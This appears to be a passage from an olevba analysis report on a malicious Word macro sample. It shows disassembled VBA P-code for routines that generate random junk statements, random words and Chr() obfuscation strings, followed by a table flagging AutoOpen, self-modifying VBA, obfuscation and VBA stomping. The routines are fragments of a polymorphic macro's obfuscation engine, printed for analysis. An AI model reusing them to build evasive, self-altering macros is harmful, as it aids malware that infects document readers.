' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	LitStr 0x0004 " OR "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	St Junkstr 
' Line #158:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	LitStr 0x0005 " MOD "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	St Junkstr 
' Line #159:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	St Junkstr 
' Line #160:
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	LitStr 0x0005 " XOR "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	St Junkstr 
' Line #161:
' 	EndSelect 
' Line #162:
' 	EndSelect 
' Line #163:
' 	EndFunc 
' Line #164:
' 	FuncDefn (Private Function GETRNDWORD(LENGTHOFWORD, MustIIncludeNumbers, id_FFFE As Variant))
' Line #165:
' 	Ld MustIIncludeNumbers 
' 	SelectCase 
' Line #166:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #167:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld LENGTHOFWORD 
' 	For 
' Line #168:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	St JJ 
' Line #169:
' 	Ld JJ 
' 	SelectCase 
' Line #170:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld P 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St P 
' Line #171:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld P 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0061 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St P 
' Line #172:
' 	EndSelect 
' Line #173:
' 	StartForVariable 
' 	Next 
' Line #174:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #175:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld LENGTHOFWORD 
' 	LitDI2 0x0002 
' 	Div 
' 	Paren 
' 	For 
' Line #176:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	St JJ 
' Line #177:
' 	Ld JJ 
' 	SelectCase 
' Line #178:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld P 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Concat 
' 	St P 
' Line #179:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld P 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0061 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Concat 
' 	St P 
' Line #180:
' 	EndSelect 
' Line #181:
' 	StartForVariable 
' 	Next 
' Line #182:
' 	EndSelect 
' Line #183:
' 	Ld P 
' 	St GETRNDWORD 
' Line #184:
' 	EndFunc 
' Line #185:
' 	FuncDefn (Private Function getshit(length, id_FFFE As Variant))
' Line #186:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld length 
' 	For 
' Line #187:
' 	Ld g 
' 	Ld Rnd 
' 	LitDI2 0x00D2 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0023 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St g 
' Line #188:
' 	StartForVariable 
' 	Next 
' Line #189:
' 	Ld g 
' 	St getshit 
' Line #190:
' 	EndFunc 
' Line #191:
' Line #192:
' 	FuncDefn (Private Function genchr(length, id_FFFE As Variant))
' Line #193:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld length 
' 	For 
' Line #194:
' 	LitStr 0x0004 "Chr("
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	St g 
' Line #195:
' 	LitStr 0x0003 " & "
' 	St k 
' Line #196:
' 	Ld l 
' 	Ld g 
' 	Concat 
' 	Ld k 
' 	Concat 
' 	St l 
' Line #197:
' 	StartForVariable 
' 	Next 
' Line #198:
' 	Ld l 
' 	Ld l 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	Paren 
' 	ArgsLd LBound 0x0002 
' 	St genchr 
' Line #199:
' 	EndFunc 
' Line #200:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|XOR                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

